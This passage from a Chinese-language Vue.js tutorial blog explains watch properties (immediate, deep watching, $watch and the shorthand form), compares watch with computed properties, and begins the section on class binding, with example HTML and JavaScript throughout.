<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="attr">isHot</span>: &#123;</span><br><span class="line">        <span class="title function_">handler</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;handler被调用了&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且，<code>handler</code>函数有两个参数，分别对应<code>修改后的值</code>、<code>修改前的值</code></p>
<p>这样我们就可以对数据进行监测，再进行对比，然后实现对应的业务逻辑</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">isHot</span>: &#123;</span><br><span class="line">    <span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516153423522.png" alt="image-20220516153423522"></p>
<p><code>immediate</code>配置项：</p>
<ul>
<li><p><code>immediate: true</code></p>
<ul>
<li><p>初始化加载时，就调用一下<code>handler</code>函数</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516153726615.png" alt="image-20220516153726615"></p>
</li>
</ul>
</li>
<li><p><code>immediate: false</code></p>
<ul>
<li>默认值</li>
</ul>
</li>
</ul>
<p>除了<code>data</code>里面的属性可以监视，<code>computed</code>计算属性里面的属性，也是可以监视的</p>
<p>监视计算属性：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="title function_">info</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">isHot</span> ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">        <span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516154034864.png" alt="image-20220516154034864"></p>
<p>第二种配置监视属性的方式：<code>$watch()</code></p>
<p>前提：<code>vm</code>实例创建完毕后</p>
<p><code>vm.$watch(attr&lt;string&gt;, options&lt;Object&gt;)</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vm.$watch(<span class="string">&#x27;isHot&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">immediate</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>同样可以实现监视</p>
<p>如果<code>attr</code>监视的属性不存在时，不会报错，但没有意义</p>
<ul>
<li><p>如果一开始就很明确监视的属性，可以在<code>watch</code>配置项里进行监视</p>
</li>
<li><p>如果是在后续的过程中，有了监视的需求，可以调用<code>$watch()</code>进行监视</p>
</li>
</ul>
<h4 id="1-11-2-3-深度监视"><a href="#1-11-2-3-深度监视" class="headerlink" title="1.11.2.3.深度监视"></a>1.11.2.3.深度监视</h4><p>现在有这么个数据结构：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">numbers</span>: &#123;</span><br><span class="line">    <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">b</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想要监视<code>numbers</code>里面的<code>a</code>的变化</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123;numbers.a&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.a++&quot;</span>&gt;</span>a的值+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">numbers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">a</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">b</span>: <span class="number">2</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">watch</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;numbers.a&#x27;</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516155521141.png" alt="image-20220516155521141"></p>
<p>监视多级结构中某个属性的变化，需要写成<code>numbers.a</code>的形式，注意这里的<code>key</code>要写成原始带引号的形式</p>
<p>如果<code>numbers</code>里有一百个属性，我们不可能写一百遍</p>
<p>如果直接监视的是最外层的数据<code>numbers</code>，则修改里面的<code>a</code>或<code>b</code>的值时，<code>vue</code>认为<code>numbers</code>是没有变化的，因为其的数据地址并没有变，除非将<code>numbers</code>整个赋值替换</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="attr">numbers</span>: &#123;</span><br><span class="line">        <span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行<code>numbers.a++</code>或<code>numbers.b++</code>，并不会调用<code>numbers</code>的<code>handler</code>回调函数</p>
<p>只要新增<code>deep</code>配置项即可监视多级结构中所有属性的变化：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="attr">numbers</span>: &#123;</span><br><span class="line">        <span class="attr">deep</span>: <span class="literal">true</span>, <span class="comment">// 开启深度监视</span></span><br><span class="line">        <span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="小结：深度监视"><a href="#小结：深度监视" class="headerlink" title="小结：深度监视"></a>小结：深度监视</h5><ul>
<li><code>Vue</code>中的<code>watch</code>默认不监视对象内部值的改变（一层）</li>
<li>配置<code>deep: true</code>可以监测对象内部值的改变（多层）</li>
<li>备注：<ul>
<li><code>Vue</code>自身是可以监测对象内部值的改变，但<code>Vue</code>提供的<code>watch</code>默认是不可以</li>
<li>使用<code>watch</code>时，根据数据的具体结构，决定是否采取深度监视</li>
</ul>
</li>
</ul>
<h4 id="1-11-2-3-监视属性简写形式"><a href="#1-11-2-3-监视属性简写形式" class="headerlink" title="1.11.2.3.监视属性简写形式"></a>1.11.2.3.监视属性简写形式</h4><p>如果不需要深度监视，也不需要初始化调用<code>handler</code>时，就可以采取简写形式</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="title function_">isHot</span>(<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将监视属性写成函数形式，就相当于<code>handler</code>函数</p>
<p>同理，<code>$watch</code>的可以简写成如下形式：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vm.$watch(<span class="string">&#x27;isHot&#x27;</span>, <span class="keyword">function</span> (<span class="params">newValue, oldValue</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(newValue, oldValue)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>注意不要写成箭头函数，会导致<code>this</code>指向问题，再次说明所有由<code>vue</code>管理的函数，都需要写成普通函数</p>
<h3 id="1-11-3-watch对比computed"><a href="#1-11-3-watch对比computed" class="headerlink" title="1.11.3.watch对比computed"></a>1.11.3.<code>watch</code>对比<code>computed</code></h3><p>用<code>watch</code>来实现拼接姓名的案例</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    姓： <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    名： <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    全名： <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;fullName&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstName</span>: <span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastName</span>: <span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fullName</span>: <span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">watch</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">firstName</span>(<span class="params">newValue</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">fullName</span> = newValue + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">lastName</span>(<span class="params">newValue</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">fullName</span> = <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + newValue</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516164553741.png" alt="image-20220516164553741"></p>
<p>此案例中，<code>watch</code>相比较于<code>computed</code>，使用命令式编码方式，重复代码较多，不够简洁</p>
<p>新需求：当<code>firstName</code>发生改变时，延迟一秒进行拼接</p>
<p>在<code>watch</code>里面可以非常畅快的进行异步操作：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="title function_">firstName</span>(<span class="params">newValue</span>) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fullName</span> = newValue + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">lastName</span>(<span class="params">newValue</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fullName</span> = <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + newValue</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是在<code>computed</code>里面是不行的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="title function_">fullName</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span><br><span class="line">        &#125;, <span class="number">1000</span>) <span class="comment">// 定时器的回调函数，并不是vue实例管理的，所以可以写成箭头函数，并且如果不写成箭头函数的话，内部的this就指向了window</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是基础的问题了，<code>return</code>是回调函数的返回值，此时<code>fullName</code>并没有返回值。</p>
<p>计算属性是不能开启异步任务来维护数据的</p>
<h4 id="1-11-3-1-小结：watch对比computed"><a href="#1-11-3-1-小结：watch对比computed" class="headerlink" title="1.11.3.1.小结：watch对比computed"></a>1.11.3.1.小结：<code>watch</code>对比<code>computed</code></h4><p>区别：</p>
<ul>
<li><code>computed</code>能完成的功能，<code>watch</code>都可以完成</li>
<li><code>watch</code>能完成的功能，<code>computed</code>不一定能完成，如<code>watch</code>可以有异步操作</li>
</ul>
<p>原则：</p>
<ul>
<li>所有被<code>Vue</code>管理的函数，最好写成普通函数，这样<code>this</code>的指向才是<code>vm</code>或组件实例对象</li>
<li>所有不被<code>Vue</code>管理的函数，如定时器的回调函数，<code>ajax</code>的回调函数，最好写成箭头函数，这样<code>this</code>的指向才是<code>vm</code>或组件实例对象</li>
</ul>
<h2 id="1-12-class与style绑定"><a href="#1-12-class与style绑定" class="headerlink" title="1.12.class与style绑定"></a>1.12.<code>class</code>与<code>style</code>绑定</h2><ul>
<li>在应用界面中，某些（个）元素的样式是变化的</li>
<li><code>class/style</code>绑定，就是专门用来实现<code>动态样式效果</code>的技术</li>
</ul>
<h3 id="1-12-1-class绑定"><a href="#1-12-1-class绑定" class="headerlink" title="1.12.1.class绑定"></a>1.12.1.<code>class</code>绑定</h3><p>给<code>div.normal</code>绑定样式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.normal</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;normal&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220516185126950.png" alt="image-20220516185126950"></p>
<h4 id="1-12-1-1-字符串写法"><a href="#1-12-1-1-字符串写法" class="headerlink" title="1.12.1.1.字符串写法"></a>1.12.1.1.字符串写法</h4><p>适用于：样式的类名不确定，需要动态指定</p>
<ul>
<li><p>基本流程</p>
<ul>
<li><p>1.预先定义类名及样式</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.bg-green</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">116</span>, <span class="number">236</span>, <span class="number">180</span>, <span class="number">0.56</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>2.定义变量，值为第一步的类名</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">bgGreen</span>: <span class="string">&#x27;bg-green&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
